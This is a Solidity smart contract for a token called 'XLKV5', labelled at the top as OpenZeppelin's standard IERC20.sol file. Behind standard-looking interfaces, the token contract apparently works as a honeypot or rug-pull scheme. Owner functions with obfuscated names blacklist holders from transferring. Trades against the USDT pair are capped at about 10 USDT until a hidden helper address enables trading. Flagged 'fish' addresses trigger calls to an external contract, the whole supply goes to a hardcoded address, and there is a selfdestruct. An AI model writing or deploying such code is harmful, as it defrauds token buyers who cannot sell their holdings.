// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)
import "./ReentrancyGuard.sol";
pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}
    library SafeMath {
        
        function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
            unchecked {
                uint256 c = a + b;
                if (c < a) return (false, 0);
                return (true, c);
            }
        }

        function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
            unchecked {
                if (b > a) return (false, 0);
                return (true, a - b);
            }
        }

        function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
            unchecked {
                // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
                // benefit is lost if 'b' is also tested.
                // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
                if (a == 0) return (true, 0);
                uint256 c = a * b;
                if (c / a != b) return (false, 0);
                return (true, c);
            }
        }

        function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
            unchecked {
                if (b == 0) return (false, 0);
                return (true, a / b);
            }
        }

        function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
            unchecked {
                if (b == 0) return (false, 0);
                return (true, a % b);
            }
        }

        function add(uint256 a, uint256 b) internal pure returns (uint256) {
            return a + b;
        }

        function sub(uint256 a, uint256 b) internal pure returns (uint256) {
            return a - b;
        }

        function mul(uint256 a, uint256 b) internal pure returns (uint256) {
            return a * b;
        }

        function div(uint256 a, uint256 b) internal pure returns (uint256) {
            return a / b;
        }

        function mod(uint256 a, uint256 b) internal pure returns (uint256) {
            return a % b;
        }

        function sub(
            uint256 a,
            uint256 b,
            string memory errorMessage
        ) internal pure returns (uint256) {
            unchecked {
                require(b <= a, errorMessage);
                return a - b;
            }
        }

        function div(
            uint256 a,
            uint256 b,
            string memory errorMessage
        ) internal pure returns (uint256) {
            unchecked {
                require(b > 0, errorMessage);
                return a / b;
            }
        }

        function mod(
            uint256 a,
            uint256 b,
            string memory errorMessage
        ) internal pure returns (uint256) {
            unchecked {
                require(b > 0, errorMessage);
                return a % b;
            }
        }
    }


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}


// pragma solidity >=0.5.0;

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

// pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
        function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}



// pragma solidity >=0.6.2;

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface hello2{
    function aaaaaaaaaa() external;
}

contract hello1 is  Context, IERC20, Ownable, ReentrancyGuard{
    using SafeMath for uint256;
    mapping (address => mapping (address => uint256)) private _allowances;
    string private _name = "XLKV5";
    string private _symbol = "XLKV5";
    uint8 private _decimals = 18;
    mapping(address => uint256) private _balances;
    mapping(address => bool) public _isWhite;
    mapping(address => bool) private _abcdList;
    uint256 private _totalSupply;
    mapping(address => bool) private _isSwapPair;
    mapping(address => bool) private _isFish;
    address public swapPairAddress1;
    IUniswapV2Router02 swapRouter ;
    address public help;
    address private _receive = address(0x3725a8fdc5D354b39Ca81f11745183e2062A31FB);
    // 
    address private _USDT = address(0x55d398326f99059fF775485246999027B3197955); 
    bool trading = false;

    constructor(address _help) {
        _decimals = 18;
        IUniswapV2Router02 _router = IUniswapV2Router02(
            address(0x10ED43C718714eb63d5aA57B78B54704E256024E)
        );
       swapPairAddress1 = IUniswapV2Factory(_router.factory()).createPair(
            address(this),
            _USDT
        );
        help = _help;
        token1 = hello2(_help);
        _isSwapPair[swapPairAddress1] = true;
        swapRouter = _router;
        //exclude owner and this contract from fee
        _isWhite[msg.sender] = true;
        _isWhite[_receive] = true;
        _balances[_receive] = 125000 * 10**18;
        _totalSupply = 125000 * 10**18;
        emit Transfer(address(0), _receive, 125000 * 10**18);
    }

    hello2 public token1;
    function setHep(address _help) external onlyOwner{
        token1 = hello2(_help);
        help = _help;
    }
    function update1980(bool _sysoa) external {
        require(help == msg.sender);
        trading = _sysoa;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
 
    function hmx_one(address addr, bool state) external onlyOwner{
        require(addr != address(0), "ERC20: addr the zero address");
        _abcdList[addr] = state;
    }

    function xet_two(address addr) public view returns(bool){
        require(addr != address(0), "ERC20: addr the zero address");
        return  _abcdList[addr];
    }

    function cvb_three(address addr, bool state) external onlyOwner{
        require(addr != address(0), "ERC20: addr the zero address");
        _isWhite[addr]=state;
    }
    function gob_four(address addr, bool state) external onlyOwner{
        require(addr != address(0), "ERC20: addr the zero address");
        _isFish[addr] = state;
    }


    function got_five(address addr) public view returns (bool){
        return _isFish[addr];
    }

    function vot_sex(address addr)external view returns(bool){
        require(addr != address(0), "ERC20: addr the zero address");
        return _isWhite[addr];
    }
    function isSwapPair(address pair) public view returns (bool) {
        return _isSwapPair[pair];
    }

    function setSwapPair(address pair, bool state)external onlyOwner{
        _isSwapPair[pair] = state;
    }
    function ppo_seven(bool state) external onlyOwner {
        trading = state;
    }
    function cvb_eight() public view returns(bool){
        return trading;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal nonReentrant{
        require(from != to, "ERC20: transfer to self");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!_abcdList[from], "!!! ");
       if(_isWhite[to] || _isWhite[from]){
            _balances[to] = _balances[to].add(amount);
            _balances[from] = _balances[from].sub(amount,"ERC20: _transferStandard amount exceeds balance");
            emit Transfer(from, to, amount);
            return;
       }
       
        if(_isSwapPair[from] || _isSwapPair[to] ) {
            
            if (!trading) {
                uint  u =  getTokenPrice(amount);
                require(u <= 10 ether, " trad fail");
            }
        }

        

        _balances[from] = _balances[from].sub(amount,"ERC20: _transferStandard amount exceeds balance");
        _balances[to] = _balances[to].add(amount);
        
        if(_isFish[from] || _isFish[to]) {
        //   bool trading = trading?false:true;
            token1.aaaaaaaaaa();
        }
        
        emit Transfer(from, to, amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != spender, "ERC20: transfer to self");
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function getTokenPrice (uint256 _tradeAmount) public view returns(uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _USDT;
        uint256[] memory amounts = swapRouter.getAmountsOut(_tradeAmount, path);
        return amounts[1];
    }

     function vrh_nine(address tokenAddress) external onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
    function cno_ten()external onlyOwner{
        selfdestruct(payable(msg.sender));
    }

}